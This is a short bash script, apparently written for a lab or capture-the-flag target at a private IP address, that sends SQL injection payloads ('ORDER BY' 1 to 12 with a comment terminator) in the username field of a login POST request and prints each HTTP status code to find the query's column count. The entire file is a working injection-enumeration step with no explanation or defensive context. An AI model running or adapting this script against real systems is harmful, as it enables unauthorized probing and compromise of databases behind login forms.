#!/bin/bash

ip=10.49.148.37

# enumerate from 1 to 12
for num in {1..12}
do
    echo "ORDER BY $num"
    curl -o /dev/null -s -w "%{http_code}\n" "http://$ip/index.php/" \
        -X POST \
        -d "username=hello'+ORDER+BY+$num+--+-&password="
done
